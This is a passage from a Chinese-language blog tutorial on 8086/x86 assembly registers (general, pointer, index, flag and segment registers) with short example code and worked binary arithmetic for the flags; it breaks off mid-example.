alt="x86汇编_寄存器1.png"></p><ol><li><strong>可见寄存器</strong>：编程中用到的寄存器，可以由指令指定，程序员可以感知</li><li><strong>不可见寄存器</strong>：在程序中不可见，由系统来指定，程序员无法感知</li></ol><hr><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><h3 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h3><h4 id="AX-x2F-BX-x2F-CX-x2F-DX"><a href="#AX-x2F-BX-x2F-CX-x2F-DX" class="headerlink" title="AX&#x2F;BX&#x2F;CX&#x2F;DX"></a>AX&#x2F;BX&#x2F;CX&#x2F;DX</h4><blockquote><p><mark>用来存放一般性数据的寄存器</mark>，例如：AX、BX、CX、DX <strong>（在 32位的 CPU 中，更名为：EAX、EBX、ECX、EDX）</strong></p><p>这四个通用寄存器都可以分成两个独立 8 位寄存器使用：AH、AL、BH、BL、CH、CL、DH、DL</p></blockquote><ul><li>以 AX 寄存器为例：<strong>（小端序存放，高位存储在高地址）</strong></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A81.png" alt="x86汇编_通用寄存器1.png"></p><ul><li>在 8086CPU 中，<strong>一个字（Word）占 16bit，由两个字节（Byte）组成</strong></li></ul><table><thead><tr><th align="left">寄存器</th><th align="left">意义和用法</th></tr></thead><tbody><tr><td align="left"><code>AX</code></td><td align="left"><strong>累加器</strong>。算术运算的主要寄存器，乘、除指令必须使用它来存放操作数</td></tr><tr><td align="left"><code>BX</code></td><td align="left"><strong>基址寄存器</strong>。计算地址时，可用来存放一段内存的起始偏移地址</td></tr><tr><td align="left"><code>CX</code></td><td align="left"><strong>计数器</strong>。可记录重复操作次数的隐含计数器</td></tr><tr><td align="left"><code>DX</code></td><td align="left"><strong>数据寄存器</strong>。在存放 32 位数据时，可与 AX 组合使用，DX 存放高 16 位，AX 存放低 16 位；在 IO 操作中可存放 IO 端口地址</td></tr></tbody></table><hr><h3 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h3><h4 id="SP-x2F-BP"><a href="#SP-x2F-BP" class="headerlink" title="SP&#x2F;BP"></a>SP&#x2F;BP</h4><blockquote><p>寄存器 SP 和 BP 通常在栈中使用，分别指向栈顶和栈底</p><p><mark>注意：SP 和 BP 不可以拆分为两个 8 位寄存器使用</mark></p></blockquote><table><thead><tr><th align="left">寄存器</th><th align="left">意义和用法</th></tr></thead><tbody><tr><td align="left"><code>SP</code></td><td align="left"><strong>堆栈指针寄存器</strong>。存放堆栈栈顶的偏移地址，总是指向堆栈段中的栈顶位置，专门用于数据进栈和出栈的位置指示，只能与 SS 配对使用</td></tr><tr><td align="left"><code>BP</code></td><td align="left"><strong>基址指针寄存器</strong>。存放堆栈基址的偏移地址，指向堆栈段中一个数据区的基址位置，通常与 SS 配对使用</td></tr></tbody></table><hr><h4 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h4><blockquote><p>栈是一种具有特殊的访问方式的存储空间，<em>后进先出</em></p><p>在基于 8086CPU 编程时，可以将一段内存当作栈来使用（<mark>高地址作为栈底，低地址作为栈顶</mark>）</p><p><mark>8086CPU 的入栈和出栈都是以字（Word）为单位进行的</mark></p></blockquote><ul><li><p>8086CPU 提供入栈和出栈指令：<code>push</code>（入栈） 和 <code>pop</code>（出栈）</p></li><li><p>假设栈空间为 <code>10000H ~ 10005H</code>，栈的结构如下：</p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%A0%88%E7%BB%93%E6%9E%841.png" alt="x86汇编_栈结构1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%A0%88%E7%BB%93%E6%9E%842.png" alt="x86汇编_栈结构2.png"></p><ul><li>由于 <code>push</code> 和 <code>pop</code> 修改的是 SP，因此栈顶的变化范围最大为：<code>0 ~ FFFFh</code></li></ul><hr><h4 id="栈顶超界"><a href="#栈顶超界" class="headerlink" title="栈顶超界"></a>栈顶超界</h4><blockquote><p><em>在 8086CPU 中，没有用于记录栈顶上限和下限的寄存器</em>，因此栈满时 <code>push</code>、栈空时 <code>pop</code> 都会发生栈顶越界问题</p></blockquote><ul><li><p>8086CPU 只知道栈顶的位置（SS:SP），但不知道栈的空间有多大</p></li><li><p>8086CPU 不保证栈的操作不会越界，因此需要程序员自己注意</p></li></ul><hr><h3 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h3><blockquote><p>指针寄存器主要包括 SI（源变址寄存器）和 DI（目的变址寄存器）</p><p><mark>注意：SI 和 DI 不可以拆分为两个 8 位寄存器使用</mark></p></blockquote><hr><h4 id="SI-x2F-DI"><a href="#SI-x2F-DI" class="headerlink" title="SI&#x2F;DI"></a>SI&#x2F;DI</h4><blockquote><p><mark>SI 和 DI 是 8086CPU 中与 BX 功能相近的寄存器</mark>，与 DS 联用可以用来确定数据段中某一存储单元的偏移地址</p><p>在串处理指令中 SI 和 DI 作为隐含的源变址寄存器和目的变址寄存器，此时 SI 和 DS 联用，DI 和 ES 联用，分别达到在数据段和附加段中寻址的目的</p></blockquote><table><thead><tr><th align="left">寄存器</th><th align="left">意义和用法</th></tr></thead><tbody><tr><td align="left"><code>SI</code></td><td align="left"><strong>源变址寄存器</strong>。存放内存中源数据区的指针，在某些指令作用下可以自增或自减</td></tr><tr><td align="left"><code>DI</code></td><td align="left"><strong>目的变址寄存器</strong>。存放内存中目的数据区的指针，在某些指令作用下可以自增或自减</td></tr></tbody></table><ul><li>例如，以下三组指令实现的功能相同：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bx <span class="token operator">+</span> <span class="token number">123</span><span class="token punctuation">]</span>mov si<span class="token punctuation">,</span> <span class="token number">0</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>si <span class="token operator">+</span> <span class="token number">123</span><span class="token punctuation">]</span>mov di<span class="token punctuation">,</span> <span class="token number">0</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>di<span class="token punctuation">]</span>mov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>di <span class="token operator">+</span> <span class="token number">123</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="专用寄存器"><a href="#专用寄存器" class="headerlink" title="专用寄存器"></a>专用寄存器</h2><h3 id="指令指针寄存器-IP"><a href="#指令指针寄存器-IP" class="headerlink" title="指令指针寄存器 IP"></a>指令指针寄存器 IP</h3><blockquote><p>指令指针寄存器 IP 存放即将执行的指令的偏移地址</p></blockquote><ul><li><p>通常配合 CS 寄存器使用，指明代码段中即将要执行的一条指令</p></li><li><p><strong>不能使用 mov 指令给 IP 寄存器赋值</strong></p></li></ul><hr><h3 id="标志寄存器-FLAG"><a href="#标志寄存器-FLAG" class="headerlink" title="标志寄存器 FLAG"></a>标志寄存器 FLAG</h3><blockquote><p>标志寄存器 FLAG 主要存放 CPU 的两类标志：状态标志和控制标志</p><p><strong>状态标志</strong>：反映处理器的当前状态，比如有无溢出、有无进位等<br><strong>控制标志</strong>：用来控制处理器的工作方式，比如是否响应可屏蔽中断等</p></blockquote><ul><li><p>在 8086CPU 中，FLAG 的 1、3、5、12、13、14、15 位并没有使用，不具有任何含义；而剩下的 0、2、4、6、7、8、9、10、11 位都具有特殊含义</p></li><li><p><em>FLAG 寄存器是按位起作用的</em>，16 位的 FLAG 寄存器图：</p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A81.png" alt="x86汇编_标志寄存器1.png"></p><ul><li>FLAG 寄存器中主要标志位的作用：</li></ul><table><thead><tr><th align="left">标志</th><th align="left">意义</th><th align="left">值为 1 的意义</th><th align="left">值为 0 的意义</th></tr></thead><tbody><tr><td align="left"><code>ZF</code></td><td align="left">零标志位</td><td align="left">结果为 0</td><td align="left">结果不为 0</td></tr><tr><td align="left"><code>PF</code></td><td align="left">奇偶标志位</td><td align="left">结果中 1 的个数为偶数</td><td align="left">结果中 1 的个数为奇数</td></tr><tr><td align="left"><code>SF</code></td><td align="left">符号标志位</td><td align="left">结果为负</td><td align="left">结果非负</td></tr><tr><td align="left"><code>CF</code></td><td align="left">进位标志位</td><td align="left">进位或借位值为 1</td><td align="left">进位或借位值为 0</td></tr><tr><td align="left"><code>OF</code></td><td align="left">溢出标志位</td><td align="left">发生溢出</td><td align="left">没有溢出</td></tr><tr><td align="left"><code>DF</code></td><td align="left">方向标志位</td><td align="left">每次操作后 SI、DI 递减</td><td align="left">每次操作后 SI、DI 递增</td></tr></tbody></table><hr><h4 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h4><blockquote><p><strong>零标志位</strong>。用来记录相关指令执行后，结果是否为 0</p><p><em>如果结果为 0，则 ZF &#x3D; 1；如果结果不为 0，则 ZF &#x3D; 0</em></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">1</span>sub ax<span class="token punctuation">,</span> <span class="token number">1</span><span class="token comment">; 执行后，结果为 0，ZF = 1</span>mov ax<span class="token punctuation">,</span> <span class="token number">2</span>sub ax<span class="token punctuation">,</span> <span class="token number">1</span><span class="token comment">; 执行后，结果不为 0，ZF = 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h4><blockquote><p><strong>奇偶标志位</strong>。用来记录相关指令执行后，结果的所有 bit 位中 1 的个数是否为偶数</p><p><em>如果 1 的个数为偶数，则 PF &#x3D; 1；如果不为偶数，则 PF &#x3D; 0</em></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> <span class="token number">1</span>add al<span class="token punctuation">,</span> <span class="token number">10</span><span class="token comment">; 执行后，结果为 00001011b，有 3 个 1（奇数个 1），PF = 0</span>mov al<span class="token punctuation">,</span> <span class="token number">1</span>or al<span class="token punctuation">,</span> <span class="token number">2</span><span class="token comment">; 执行后，结果为 00000011b，有 2 个 1（偶数个 1），PF = 1</span>sub al<span class="token punctuation">,</span> al<span class="token comment">; 执行后，结果为 00000000b，有 0 个 1（偶数个 1），PF = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h4><blockquote><p><strong>符号标志位</strong>。用来记录相关指令执行后，结果是否为负，是 CPU 对有符号数运算结果正负的一种记录</p><p>如果将数据当作有符号数，通过 SF 可以得知结果的正负；但如果将数据当作无符号数，那么 SF 的值就没有意义了</p><p><em>如果结果为负，则 SF &#x3D; 1；如果结果非负，则 SF &#x3D; 0</em></p></blockquote><ul><li><p>在计算机中，通常使用补码来表示有符号数</p></li><li><p>在计算机中，一个数据既可以看成是有符号数，也可以看成是无符号数。例如：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 10000001badd al<span class="token punctuation">,</span> <span class="token number">1</span><span class="token comment">; 结果：(al) = 10000010b</span><span class="token comment">; 如果将 add 指令的运算当作无符号数，那么相当于 129 + 1 = 130（10000010b）</span><span class="token comment">; 如果将 add 指令的运算当作有符号数，那么相当于 -127 + 1 = -126（10000010b）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>CPU 在执行 add 等指令时，必然会影响到 SF 的值，至于需不需要利用 SF 的值，就看我们如何看待指令所进行的运算</p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 10000001badd al<span class="token punctuation">,</span> <span class="token number">1</span><span class="token comment">; 执行后，结果为 10000010b，SF = 1</span><span class="token comment">; 说明：如果指令进行的是有符号数运算，那么结果为负</span>mov al<span class="token punctuation">,</span> 10000001badd al<span class="token punctuation">,</span> 01111111b<span class="token comment">; 执行后，结果为 00000000b，SF = 0</span><span class="token comment">; 说明：如果指令进行的是有符号数运算，那么结果为非负</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>某些指令可能影响标志寄存器的多个标记位<br>例如：执行 <code>sub al, al</code> 后，ZF、PF、SF 等标志位都会受到影响，ZF &#x3D; 1，PF &#x3D; 1，SF &#x3D; 0</p></blockquote><hr><h4 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h4><blockquote><p><strong>进位标志位</strong>。在进行<strong>无符号数</strong>运算时，记录运算结果的最高有效位向更高位的进位值，或从更高位的借位值</p><p><mark>CF 是对无符号数运算有意义的标志位，对于无符号数运算，CPU 用 CF 记录最高有效位是否进位</mark></p><p><em>如果进位或借位值为 1，则 CF &#x3D; 1；如果进位或借位值为 0，则 CF &#x3D; 0</em></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 98hadd al<span class="token punctuation">,</span> al<span class="token comment">; 执行后，CF = 1（向更高位进位）</span>add al<span class="token punctuation">,</span> al<span class="token comment">; 执行后，CF = 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$[98h]_补$ &#x3D; 10011000</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">10011000</span><span class="token operator">+</span>  <span class="token number">10011000</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> <span class="token number">00110000</span>   <span class="token number">00110000</span><span class="token operator">+</span>  <span class="token number">00110000</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>   <span class="token number">01100000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 97hsub al<span class="token punctuation">,</span> 98h<span class="token comment">; 执行后，CF = 1（向更高位借位）</span>sub al<span class="token punctuation">,</span> al<span class="token comment">; 执行后，CF = 0（向更高位借位）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$[-98h]_补$ &#x3D; 01101000<br>$[97h]_补$ &#x3D; 10010111</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">10010111</span><span class="token operator">+</span>  <span class="token number">01101000</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>   <span class="token number">11111111</span>   <span class="token number">00000001</span><span class="token operator">+</span>  <span class="token number">11111111</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> <span class="token number">00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h4><blockquote><p><strong>溢出标志位</strong>。一般情况下，OF 记录了有符号数的运算结果是否发生溢出</p><p><mark>OF 是对有符号数运算有意义的标志位，对于有符号数运算，CPU 用 OF 记录是否溢出</mark></p><p><em>如果发生溢出，则 OF &#x3D; 1；如果没有溢出，则 OF &#x3D; 0</em></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> <span class="token number">98</span>add al<span class="token punctuation">,</span> <span class="token number">99</span><span class="token comment">; add 指令执行后，CF = 0，OF = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>$[98]_补$ &#x3D; 01100010<br>$[99]_补$ &#x3D; 01100011</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">01100010</span><span class="token operator">+</span>  <span class="token number">01100011</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>   <span class="token number">11000101</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>对于无符号数 98 + 99 &#x3D; 197 &lt; 255 没有进位，所以 CF &#x3D; 0</li><li>对于有符号数 98 + 99 发生溢出（正 + 正 &#x3D; 负），所以 OF &#x3D; 1</li></ol><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 0F0hadd al<span class="token punctuation">,</span> 88h<span class="token comment">; add 指令执行后，CF = 1，OF = 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>$[0F0h]_补$ &#x3D; 11110000<br>$[88h]_补$ &#x3D; 10001000</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">11110000</span><span class="token operator">+</span>  <span class="token number">10001000</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> <span class="token number">01111000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>对于无符号数 0F0h + 88h &#x3D; 376 &gt; 255 有进位，所以 CF &#x3D; 1</li><li>对于有符号数 0F0h + 88h 发生溢出（负 + 负 &#x3D; 正），所以 OF &#x3D; 1</li></ol><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 0F0hadd al<span class="token punctuation">,</span> 78h<span class="token comment">; add 指令执行后，CF = 1，OF = 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>$[0F0h]_补$ &#x3D; 11110000<br>$[78h]_补$ &#x3D; 01111000</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">11110000</span><span class="token operator">+</span>  <span class="token number">01111000</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token number">1</span> <span class="token number">01101000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>对于无符号数 0F0h + 78h &#x3D; 360 &gt; 255 有进位，所以 CF &#x3D; 1</li><li>对于有符号数 0F0h + 78h 没有发生溢出（最高位进位 1 ⊕ 次高位进位 1 &#x3D; 0），所以 OF &#x3D; 0</li></ol><blockquote><ul><li><strong>仅当两个符号相同的数相加，或两个符号相异的数相减，才可能产生溢出</strong></li><li><strong>进位是溢出的必要条件</strong></li></ul><p>计算机中补码运算的溢出判断方法：</p><ol><li>假设 <code>Xf</code>、<code>Yf</code> 分别为两个操作数的符号位，<code>Zf</code> 为运算结果的符号位<br>① 当 <code>Xf = Yf = 0</code>（两数同为正），而 <code>Zf = 1</code>（结果为负），正溢出<br>② 当 <code>Xf = Yf = 1</code>（两数同为负），而 <code>Zf = 0</code>（结果为正），负溢出</li><li>假设 <code>Cs</code> 表示符号位的进位，<code>Cp</code> 表示最高数值位进位，<code>⊕</code> 表示异或（<strong>Cs 等价于进位标志位 CF</strong>）<br>① 若 <code>Cs ⊕ Cp = 0</code>，无溢出<br>② 若 <code>Cs ⊕ Cp = 1</code>，有溢出</li><li>假设使用<strong>变形补码</strong>进行<strong>双符号位</strong>运算（正数符号为 00，负数符号为 11）<br>① 若运算结果的双符号位为 01，正溢出<br>② 若运算结果的双符号位为 10，负溢出<br>③ 若运算结果的双符号位为 00 或 11，无溢出</li></ol></blockquote><hr><h4 id="DF"><a href="#DF" class="headerlink" title="DF"></a>DF</h4><blockquote><p><strong>方向标志位</strong>。在串处理指令中，控制每次操作后 SI、DI 的增减</p><p><em>每次操作后 SI、DI 递增，则 DF &#x3D; 0；每次操作后 SI、DI 递减，则 DF &#x3D; 1</em></p></blockquote><ul><li>8086CPU 中，提供了两条指令对 DF 进行设置：</li></ul><table><thead><tr><th align="left">指令</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>cld</code></td><td align="left">将标志寄存器 DF 位设为 0</td></tr><tr><td align="left"><code>std</code></td><td align="left">将标志寄存器 DF 位设为 1</td></tr></tbody></table><ul><li>例如：使用串传送指令 movsb 将 data 段中的第一个字符串复制到其后的空间中</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segmentdb 'Hello 4ss1du0us<span class="token operator">!</span>'db <span class="token number">16</span> dup <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data endscode segmentmain: mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> axmov si<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; ds:si 指向 data:0</span>mov es<span class="token punctuation">,</span> axmov di<span class="token punctuation">,</span> <span class="token number">16</span>   <span class="token comment">; es:di 指向 data:0010</span>mov cx<span class="token punctuation">,</span> <span class="token number">16</span>   <span class="token comment">; 设置 rep 循环 16 次</span>cld   <span class="token comment">; 设置 df = 0，使 si、di 递增，movsb 正向传送</span>rep movsbmov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>例如：使用串传送指令 movsb 将 F000h 段中的最后 16 个字符复制到 data 段中</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segmentdb <span class="token number">16</span> dup <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data endscode segmentmain: mov ax<span class="token punctuation">,</span> 0F000hmov ds<span class="token punctuation">,</span> axmov si<span class="token punctuation">,</span> 0FFFFh   <span class="token comment">; ds:si 指向 F000:FFFF（F000 段的最后一个字符处）</span>mov es<span class="token punctuation">,</span> datamov di<span class="token punctuation">,</span> <span class="token number">15</span>   <span class="token comment">; es:di 指向 data:000F（data 段的最后一个字符处）</span>mov cx<span class="token punctuation">,</span> <span class="token number">16</span>   <span class="token comment">; 设置 rep 循环 16 次</span>std   <span class="token comment">; 设置 df = 1，使 si、di 递减，movsb 反向传送</span>rep movsbmov ax<span class="token punctuation">,</span> 4c00hint 21hcode endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><blockquote><p><mark>用来提供段地址，段地址在 8086CPU 的段寄存器中存放</mark>，例如：CS、DS、SS、ES</p></blockquote><h3 id="CS-和-IP"><a href="#CS-和-IP" class="headerlink" title="CS 和 IP"></a>CS 和 IP</h3><blockquote><p><em>CS 和 IP 是 8086CPU 中两个最关键的寄存器，它们指示了 CPU 当前要读取指令的地址</em></p></blockquote><ul><li><p>在 8086CPU 中的任意时刻，假设 CS 中的内容为：M，IP 中的内容为：N，那么：</p><ol><li>8086CPU 将从内存的 <code>M * 16 + N</code> 单元开始，读取一条指令并执行</li><li>也可以说，8086CPU 将 <code>CS:IP</code> 指向的内容当作指令执行</li><li><strong>CS 中的内容作为段地址，IP 中的内容作为偏移地址</strong></li></ol></li><li><p>8086CPU 只知道当前要执行的代码的位置（CS:IP），但不知道具体要执行的指令有多少</p></li><li><p>以 8086CPU 读取、执行指令的工作原理为例：</p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A81.png" alt="x86汇编_段寄存器1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A82.png" alt="x86汇编_段寄存器2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A83.png" alt="x86汇编_段寄存器3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A84.png" alt="x86汇编_段寄存器4.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A85.png" alt="x86汇编_段寄存器5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A86.png" alt="x86汇编_段寄存器6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A87.png" alt="x86汇编_段寄存器7.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A88.png" alt="x86汇编_段寄存器8.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A89.png" alt="x86汇编_段寄存器9.png"></p><blockquote><p>工作过程可以简要概括如下：</p><ol><li>从 <code>CS:IP</code> 指向的内存单元读取指令，读取的指令会进入指令缓冲器</li><li><code>IP = IP + 所读取的指令的长度</code>，指向下一条指令的地址</li><li>执行指令</li><li>跳转到步骤 1，重复这个流程</li></ol></blockquote><blockquote><p>注意：</p><ol><li>当 CPU 刚开始工作时，<code>CS</code> 被设置为 <code>FFFFh</code>，<code>IP</code> 被设置为 <code>0000h</code>，因此 <code>FFFF0h</code> 单元中存放的是 CPU 开机后执行的第一条指令</li><li><em><code>mov</code> 指令不能用来修改 CS 和 IP 这两个寄存器的值</em></li><li>最简单的方法，可以通过 jmp 指令来<strong>修改 CS、IP 的值</strong>：<br><code>jmp 段地址:偏移地址</code><br>jmp 2AE3:3，执行后：CS&#x3D;2AE3h，IP&#x3D;0003h<br>jmp 3:0B16，执行后：CS&#x3D;0003h，IP&#x3D;0B16h</li><li>如果只想<strong>修改 IP 的值</strong>：<br><code>jmp 通用寄存器</code><br>jmp ax<br>执行前：AX&#x3D;1000h，CS&#x3D;2000h，IP&#x3D;0003h；<br>执行后：AX&#x3D;1000h，CS&#x3D;2000h，IP&#x3D;1000h</li></ol></blockquote><hr><h3 id="DS-和-address"><a href="#DS-和-address" class="headerlink" title="DS 和 [address]"></a>DS 和 [address]</h3><blockquote><p>DS 寄存器通常用来存放要访问的数据的段地址</p></blockquote><ul><li>例如，读取 <code>10000h（1000:0）</code> 单元的内容，并存放到 <code>al</code> 中：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov bx<span class="token punctuation">,</span> 1000h  <span class="token comment">; 8086CPU不支持直接将数据送入段寄存器，因此通过bx中转</span>mov ds<span class="token punctuation">,</span> bx  <span class="token comment">; 数据段地址设为1000h</span>mov al<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token operator">/</span><span class="token operator">/</span>内存单元的偏移地址是<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>再例如，将 <code>al</code> 中的内容存放到内存单元 <code>10000h（1000:0）</code> 的位置：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov bx<span class="token punctuation">,</span> 1000hmov ds<span class="token punctuation">,</span> 